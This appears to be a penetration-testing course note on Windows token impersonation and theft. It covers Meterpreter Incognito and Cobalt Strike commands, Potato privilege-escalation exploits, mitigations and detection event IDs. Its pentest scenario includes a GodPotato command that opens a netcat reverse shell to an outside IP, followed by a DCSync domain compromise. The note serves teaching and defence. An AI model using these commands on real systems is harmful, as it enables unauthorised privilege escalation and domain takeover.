---
tags: [active-directory, intermediate, lateral-movement, vapt]
difficulty: intermediate
module: "68 - AD Lateral Movement and Credential Access"
topic: "68.15 Token Impersonation and Stealing"
---
# 15 - Token Impersonation and Stealing Incognito

## 1. Introduction to Windows Tokens

In the Windows operating system architecture, access control and identity are fundamentally governed by **Access Tokens**. When a user successfully authenticates to a system (via interactive logon, network logon, or service startup), the Local Security Authority (LSA) creates an access token for that session. 

This token acts much like a physical corporate ID badge; it contains the user's Security Identifier (SID), the SIDs of all groups the user belongs to, and a list of specific privileges assigned to the user. Every single process and thread executed by that user carries a copy of this token. 

During post-exploitation, if an attacker compromises a machine (typically requiring local Administrator or SYSTEM privileges), they can interact with the tokens of other users who currently have active or disconnected sessions on that machine. By stealing and impersonating a high-privilege token (e.g., a Domain Admin who left an RDP session active, or a service running as `NT AUTHORITY\SYSTEM`), the attacker instantly assumes the privileges of that user without ever needing to know their plaintext password or NTLM hash.

### 1.1 Token Types

1. **Primary Tokens:** Associated directly with a process. When a process starts, it gets a primary token. Primary tokens can only be duplicated and applied to new processes if the attacker holds the `SeAssignPrimaryTokenPrivilege`.
2. **Impersonation Tokens:** Associated with a thread. They allow a thread within a process to temporarily adopt a different security context. This is heavily used in client/server models (e.g., an IIS worker process temporarily impersonating the logged-in web user to access a specific file, then reverting to the service account).

## 2. Token Impersonation Attack Mechanics

To successfully steal and use a token, an attacker relies on specific Windows privileges, typically granted by default to the `Administrators` group and the `SYSTEM` account.

**Crucial Privileges for Token Manipulation:**
- `SeDebugPrivilege`: Allows a process to inspect, pause, and adjust the memory of other running processes. Crucial for extracting token handles from foreign processes.
- `SeImpersonatePrivilege`: Allows a process to impersonate a client after authentication. This is the cornerstone of token impersonation.
- `SeAssignPrimaryTokenPrivilege`: Allows a process to replace the primary token associated with a newly created child process.

If an attacker lands on a machine as a local Administrator, they possess `SeDebugPrivilege`. They can search the system for processes running under different user contexts, duplicate their tokens, and apply them to their own attack tools, effectively moving laterally on the same machine.

## 3. Tooling: Incognito and Cobalt Strike

The most famous tool for token manipulation is `Incognito`. Originally developed by Luke Jennings, it was seamlessly integrated into Metasploit and has heavily influenced the token manipulation commands in Cobalt Strike, Covenant, and standard C# offensive tooling (like `SharpRoast` or `Rubeus`).

### 3.1 Metasploit (Meterpreter) Implementation

Within a high-privilege Meterpreter session, the `incognito` extension is the standard vehicle for this attack.

**Step 1: Load Incognito**
```meterpreter
meterpreter > load incognito
```

**Step 2: List Available Tokens**
Tokens are split into Delegation and Impersonation tokens.
```meterpreter
meterpreter > list_tokens -u
```
*Output snippet:*
```text
Delegation Tokens Available
========================================
NT AUTHORITY\SYSTEM
DOMAIN\Administrator
DOMAIN\BackupService

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK SERVICE
```

**Step 3: Impersonate a Token**
If `DOMAIN\Administrator` is available (perhaps they ran a script on this machine recently), the attacker simply runs:
```meterpreter
meterpreter > impersonate_token "DOMAIN\Administrator"
```

**Step 4: Verification**
```meterpreter
meterpreter > getuid
Server username: DOMAIN\Administrator
```
At this point, any network interaction (like accessing `\\DC01\C$` or executing WMI queries against remote hosts) will occur under the context of `DOMAIN\Administrator`.

### 3.2 Cobalt Strike Implementation

Cobalt Strike's Beacon provides native token manipulation commands that rely on the same underlying Windows APIs (`DuplicateTokenEx`, `ImpersonateLoggedOnUser`, `CreateProcessWithTokenW`).

- `getuid`: Shows current token.
- `steal_token <PID>`: Steals a token from a specific Process ID and applies it to the current thread.
- `make_token <DOMAIN\User> <Password>`: Creates a new token using provided credentials. It does not verify locally, but injects the token into memory for network authentication.
- `rev2self`: Reverts the thread back to the original primary token of the process.

**Example CS Flow:**
```bash
beacon> ps
# Attacker sees svchost.exe running as SYSTEM (PID 1452)
beacon> steal_token 1452
# Beacon is now operating as SYSTEM
beacon> ls \\DC01\C$
```

## 4. Visualizing Token Impersonation Architecture

```text
+--------------------------------------------------------------------------+
|                   Token Impersonation Execution Flow                     |
+--------------------------------------------------------------------------+

  Attacker Process                     Victim Process (e.g., cmd.exe)
  (e.g., beacon.exe)                   User: DOMAIN\Admin
  Token: LocalAdmin                    Token: DOMAIN\Admin
         |                                     |
         | 1. OpenProcess(SeDebugPrivilege)    |
         +------------------------------------>|
         |                                     |
         | 2. OpenProcessToken()               |
         +------------------------------------>|
         |                                     |
         |<----- Returns Token Handle ---------+
         |
         | 3. DuplicateTokenEx()
         |    (Creates a copy of the Admin token)
         v
  +-------------------+
  | Duplicated Token  |
  | (DOMAIN\Admin)    |
  +-------------------+
         |
         | 4. ImpersonateLoggedOnUser() OR CreateProcessWithTokenW()
         v
  +-----------------------------------+
  | Attacker Thread / New Process     |
  | Context: DOMAIN\Admin             |
  +-----------------------------------+
         |
         | 5. SMB / RPC Request to Network
         v
    [Domain Controller validates request as DOMAIN\Admin]
```

## 5. Token Abuses: Exploiting SeImpersonatePrivilege

If an attacker lands on a system as a service account (e.g., `NT AUTHORITY\NETWORK SERVICE`, `LOCAL SERVICE`, or an IIS AppPool identity), they generally lack full local Administrator rights. However, service accounts are frequently granted `SeImpersonatePrivilege` to function correctly in client-server paradigms.

Attackers wildly abuse this to elevate to `SYSTEM` via a class of attacks affectionately known as the "Potato" exploits (RottenPotato, JuicyPotato, RoguePotato, GodPotato, SweetPotato).

**The Potato Mechanism:**
1. The attacker tricks a high-privilege service (like the RPC subsystem or DCOM) into authenticating to a local listener controlled by the attacker.
2. When the `SYSTEM` account authenticates to the listener, a `SYSTEM` authentication token is generated by the OS.
3. Because the attacker has `SeImpersonatePrivilege`, they are permitted to intercept and capture this token.
4. The attacker duplicates the `SYSTEM` token and uses it to spawn a new process (e.g., `cmd.exe` or `beacon.exe`) as `NT AUTHORITY\SYSTEM`.

## 6. Defensive Considerations and Detection

### Mitigation Strategies

- **Limit Interactive Logons:** Domain Admins should NEVER log into standard workstations or low-tier servers. Doing so leaves their high-privilege token in memory, susceptible to theft via `SeDebugPrivilege`. Implement a strict Tiered Administration Model.
- **Logoff vs. Disconnect:** When administrators finish a session, they must Log Off rather than simply disconnecting the RDP session. Disconnected sessions retain tokens indefinitely until rebooted.
- **Restricted Admin Mode:** When RDP is necessary, use Restricted Admin Mode (`mstsc.exe /RestrictedAdmin`). This prevents the delegation of reusable credentials (and thus powerful primary tokens) to the target machine.
- **Service Account Hardening:** Remove `SeImpersonatePrivilege` from service accounts where it is not strictly required by the application logic, mitigating the Potato family of exploits.

### Detection Mechanisms

- **Event ID 4624 (Logon):** Look for logon type `9` (NewCredentials), which is often triggered by `make_token` or `runas /netonly`.
- **Event ID 4673 (Sensitive Privilege Use):** High volume of `SeDebugPrivilege` usage by unexpected processes (processes other than legitimate management agents).
- **Process Monitoring:** Creating a process with a different token than its parent often generates Event ID 4688 with distinct Account Name mismatches between the Creator Process and the New Process.
- **API Hooking/EDR Telemetry:** Modern EDRs aggressively monitor the `DuplicateTokenEx` and `CreateProcessWithTokenW` APIs, especially when called by unsigned, anomalous binaries, or memory-injected threads.

## Real-World Attack Scenario

During a penetration test for an e-commerce platform, the attacker gained initial access as the `iisapppool\defaultapppool` service account via a remote code execution vulnerability in a public-facing web application. Running `whoami /priv`, the attacker noted they held the `SeImpersonatePrivilege`, typical for IIS worker processes. This immediately opened the door to local privilege escalation.

The attacker uploaded and executed a custom compilation of `GodPotato`, directing it to execute a reverse shell payload:
```cmd
GodPotato-NET4.exe -cmd "C:\Temp\nc.exe 10.10.14.50 4444 -e cmd.exe"
```
By tricking the local RPC subsystem into authenticating to a controlled listener, `GodPotato` intercepted the resulting `SYSTEM` token, duplicated it, and launched the netcat shell as `NT AUTHORITY\SYSTEM`.

Now operating with full system control, the attacker enumerated the active sessions on the web server using `query user`. The output revealed that a Senior Systems Administrator (`CORP\SysAdmin01`) had a "Disconnected" RDP session that had been lingering for three days. Because the session wasn't explicitly logged off, the administrator's high-privileged token was still residing in the memory of the `lsass.exe` and `winlogon.exe` processes.

Switching to a Cobalt Strike beacon deployed via the netcat shell, the attacker listed the process tree and identified `explorer.exe` running under `CORP\SysAdmin01` (PID 4012). To assume this identity without needing the administrator's password, the attacker executed a token theft command:
```bash
beacon> steal_token 4012
```
Cobalt Strike successfully duplicated the token and applied it to the beacon's thread. The attacker verified the context switch by running `getuid`, which returned `CORP\SysAdmin01`. Now wielding a highly privileged domain token, the attacker immediately executed a DCSync attack to dump the `krbtgt` hash, completely compromising the domain environment from a web server without ever cracking a single password.

## 7. Chaining Opportunities

- **[[17 - Lateral Movement via WMI and WinRM]]:** After stealing a domain admin token, the attacker will immediately use WMI or WinRM to move laterally to the Domain Controller.
- **[[02 - Local Privilege Escalation Essentials]]:** Token impersonation is a core mechanic of shifting from Local Admin to SYSTEM, or from a Service Account to SYSTEM via Potato exploits.
- **[[22 - DCSync Attacks]]:** An attacker might steal a Domain Admin token specifically to execute a DCSync command from a non-domain-controller machine, dumping the entire domain's hashes.
- **[[24 - Bypassing UAC]]:** Certain UAC bypasses rely on token duplication and impersonation to launch high-integrity processes without prompting the user.

## 8. Related Notes

- [[08 - Pass the Hash]]
- [[11 - Overpass the Hash]]
- [[05 - Windows Post-Exploitation Enumeration]]
